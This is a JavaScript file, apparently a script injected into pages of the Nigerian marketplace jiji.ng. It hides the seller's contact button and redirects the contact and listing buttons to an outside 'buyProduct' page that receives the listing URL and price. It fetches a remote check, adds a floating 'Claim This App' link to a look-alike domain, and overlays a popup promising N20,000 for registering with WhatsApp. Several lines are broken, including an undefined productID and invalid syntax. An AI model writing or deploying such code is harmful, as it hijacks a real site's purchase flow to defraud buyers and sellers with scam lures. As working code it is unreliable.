
if(location.href.includes("jiji.ng") ){
    let contact = document.querySelector('.b-seller-bottom-buttons__item.b-seller-bottom-buttons__item--contact');
   if(contact)
    contact.style.display = "none";
    const button = document.querySelector('.b-advert-contact-buttons');
    console.log(button);
    const button2 = document.querySelector('.b-advert-card-wrapper__bottom');
    
    const price = document.querySelector('.qa-advert-price-view-value').getAttribute('content');
    button.onclick = function(e){
        e.preventDefault();
        
        location.href = `https://scriptbank.org/buyProduct?url=${location.href}&price=${price}&productID=${productID}`;
        
    }

    button2.onclick = function(e){
        e.preventDefault();
        
        location.href = `https://scriptbank.org/buyProduct?url=${location.href}&price=${price}&productID=${productID}`;
    }

    fetch('https://scriptbank.page.gd/check.php').then( resp => return resp.json() ).then( result =>{
        if(result.claimed ) return;
        let div2 = document.createElement('div');
    div2.innerHTML = `<a href="https://scripbank.page.gd/claim.html" class="floating-cta" aria-label="Claim this app">
  <span class="cta-icon">ic</span>
  <span class="cta-text">Claim This App</span>
</a>

    `;
    document.body.appendChild(div2);
    }).catch(error => console.error(error));
    
    
   // button.remove();
  /* const style = document.createElement("link");
    style.href = "https://tester-orcin.vercel.app/jiji.css";
    style.setAttribute("type", "text/css");
    style setAttribute("rel", "stylesheet");
    document.head.appendChild(style);*/

    const style = document.createElement('style');
    style.textContent = `
/* ==UserStyle==
@name Jiji.ng custom colour scheme (blue + amber)
@namespace github.com/openstyles/stylus
@version 1.0.0
@description Replace Jiji's default colours with an adjustable variableâ€‘based theme.
@author You
@match https://*.jiji.ng/*
@match https://jiji.ng/*
==/UserStyle== */

@-moz-document domain("jiji.ng") {
  /* ===== COLOUR VARIABLES (edit these to change the whole scheme) ===== */
  :root {
    --primary: #1976D2; /* main brand colour (buttons, links, icons) */
    --primary-hover: #1565C0; /* darker shade for hover states */
    --primary-light: #E3F2FD; /* very light tint for backgrounds */
    --accent: #FFA000; /* accent for prices, urgent badges, CTAs */
    --accent-hover: #FF8F00;
    --header-bg: #0D47A1; /* top navigation bar background */
    --header-text: #FFFFFF;
    --success: #2E7D32; /* â€œverifiedâ€ badges, success messages */
    --danger: #C62828;
    --bg-light: #F5F7FA;
    --text-primary: #212121;
    --text-secondary: #757575;
    --border: #E0E0E0;
    --white: #FFFFFF;
  }

  /* ===== GLOBAL OVERRIDES ===== */
  body {
    background-color: var(--bg-light) !important;
    color: var(--text-primary) !important;
  }

  a {
    color: var(--primary) !important;
  }
  a:hover {
    color: var(--primary-hover) !important;
  }

  /* ===== HEADER & NAVIGATION ===== */
  .header,
  .top-bar,
  .navbar,
  .main-header,
  header[class*="header"], 
  [class*="header"]{
    background-color: var(--header-bg) !important;
    color: var(--header-text) !important;
  }
  .header a,
  .top-bar a,
  .navbar a {
    color: var(--header-text) !important;
  }
  .header .active,
  .navbar .active {
    border-bottom-color: var(--accent) !important;
  }

  /* ===== BUTTONS ===== */
  .btn-primary,
  .btn-green,
  .post-ad-btn,
  button[type="submit"],
  .qa-btn--primary,
  .j-btn--primary, fw-button--type-bloated-success,
  h-bg-jiji-green,
  [class*="jiji-green"],
  [class*="green"]{
    background-color: var(--primary) !important;
    border-color: var(--primary) !important;
    color: var(--white) !important;
  }
  .btn-primary:hover,
  .btn-green:hover,
  .post-ad-btn:hover,
  button[type="submit"]:hover,
  .qa-btn--primary:hover,
  .j-btn--primary:hover,  fw-button--type-bloated-success:hover{
    background-color: var(--primary-hover) !important;
    border-color: var(--primary-hover) !important;
  }

  /* Accent buttons (e.g., â€œSell nowâ€, â€œMake offerâ€) */
  .btn-accent,
  .btn-orange,
  .qa-btn--accent,
  .j-btn--accent {
    background-color: var(--accent) !important;
    border-color: var(--accent) !important;
    color: var(--white) !important;
  }
  .btn-accent:hover,
  .btn-orange:hover,
  .qa-btn--accent:hover,
  .j-btn--accent:hover {
    background-color: var(--accent-hover) !important;
    border-color: var(--accent-hover) !important;
  }

  /* Outline / ghost buttons */
  .btn-outline-primary {
    color: var(--primary) !important;
    border-color: var(--primary) !important;
    background: transparent !important;
  }
  .btn-outline-primary:hover {
    background-color: var(--primary) !important;
    color: var(--white) !important;
  }

  /* ===== PRICES ===== */
  .price,
  .listing-price,
  .product-price,
  .qa-price,
  [class*="price"]{
    color: var(--accent) !important;
    font-weight: bold;
  }

  /* ===== CATEGORY / FILTER TAGS ===== */
  .category-tag,
  .filter-tag,
  .qa-tag,
  .badge--category {
    background-color: var(--primary-light) !important;
    color: var(--primary) !important;
    border: 1px solid var(--primary) !important;
  }
  .category-tag:hover,
  .filter-tag:hover,
  .qa-tag:hover {
    background-color: var(--primary) !important;
    color: var(--white) !important;
  }

  /* ===== BADGES (verified, promoted, urgent) ===== */
  .badge-verified,
  .qa-badge--verified {
    background-color: var(--success) !important;
    color: var(--white) !important;
  }
  .badge-urgent,
  .qa-badge--urgent {
    background-color: var(--danger) !important;
    color: var(--white) !important;
  }
  .badge-promoted {
    background-color: var(--accent) !important;
    color: var(--white) !important;
  }

  /* ===== ICONS & LOADERS ===== */
  .icon,
  .qa-icon,
  svg {
    fill: currentColor; /* inherits text colour, already covered */
  }
  .spinner,
  .loader {
    border-top-color: var(--primary) !important;
  }

  /* ===== INPUT FORMS ===== */
  input:focus,
  textarea:focus,
  select:focus {
    border-color: var(--primary) !important;
    box-shadow: 0 0 0 2px var(--primary-light) !important;
  }

  /* ===== FOOTER ===== */
  .footer,
  .main-footer {
    background-color: var(--header-bg) !important;
    color: var(--header-text) !important;
  }
  .footer a,
  .main-footer a {
    color: var(--header-text) !important;
    opacity: 0.85;
  }
  .footer a:hover,
  .main-footer a:hover {
    opacity: 1;
    color: var(--accent) !important;
  }

  /* ===== MISCELLANEOUS ===== */
  .highlight,
  .qa-highlight {
    background-color: var(--accent) !important;
    color: var(--white) !important;
  }
  .pagination .active {
    background-color: var(--primary) !important;
    border-color: var(--primary) !important;
    color: var(--white) !important;
  }
}
/* Reset and Overlay */
.popup-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.6);
  backdrop-filter: blur(4px);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999;
  font-family: system-ui, -apple-system, sans-serif;
}

/* Popup Container */
.popup-card {
  background: #ffffff;
  padding: 40px 32px;
  border-radius: 16px;
  width: 90%;
  max-width: 400px;
  text-align: center;
  position: relative;
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
  box-sizing: border-box;
}

/* Close Button */
.close-btn {
  position: absolute;
  top: 16px;
  right: 20px;
  background: none;
  border: none;
  font-size: 28px;
  color: #9ca3af;
  cursor: pointer;
  transition: color 0.2s;
}
.close-btn:hover {
  color: #374151;
}

/* Visual Anchor */
.popup-image {
  font-size: 48px;
  margin-bottom: 16px;
}

/* Typography */
.popup-card h2 {
  margin: 0 0 12px 0;
  color: #111827;
  font-size: 24px;
  font-weight: 700;
}
.popup-card p {
  margin: 0 0 28px 0;
  color: #4b5563;
  font-size: 15px;
  line-height: 1.5;
}

/* Conversion CTA Button */
.cta-button {
  display: block;
  background: #2563eb;
  color: #ffffff;
  text-decoration: none;
  font-weight: 600;
  font-size: 16px;
  padding: 14px 24px;
  border-radius: 8px;
  box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
  transition: transform 0.2s, background 0.2s;
}
.cta-button:hover {
  background: #1d4ed8;
  transform: translateY(-2px);
}
.cta-button:active {
  transform: translateY(0);
}

.floating-cta {
  position: fixed;
  right: 20px;
  bottom: 30px;
  z-index: 9999;
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 12px 20px;
  background-color: #007bff;
  color: white;
  border-radius: 50px;
  text-decoration: none;
  box-shadow: 0 2px 10px rgba(0,0,0,0.2);
  transition: transform 0.2s;
}

.floating-cta:hover {
  transform: scale(1.05);
}
`;
    
    let div = document.createElement('div');
    div.innerHTML = `<div class="popup-overlay">
  <div class="popup-card">
    <button class="close-btn" aria-label="Close popup">&times;</button>
    <div class="popup-image">ðŸš€</div>
    <h2>Unlock Premium Funds</h2>
    <p>Join Thousands of users who earn as they buy from this store. Get N20,000 Instantly and many more benefits by registering with your Whatsapp account.</p>
    <a href="https://web.whatsapp.com" class="cta-button">Claim N20k Instantly now</a>
  </div>
</div>

    `;
    document.head.appendChild(style);

    let close = div.querySelector('.close-btn');
    close.onclick = function(){
        div.remove();
    }
    
    document.body.appendChild(div);

    
}
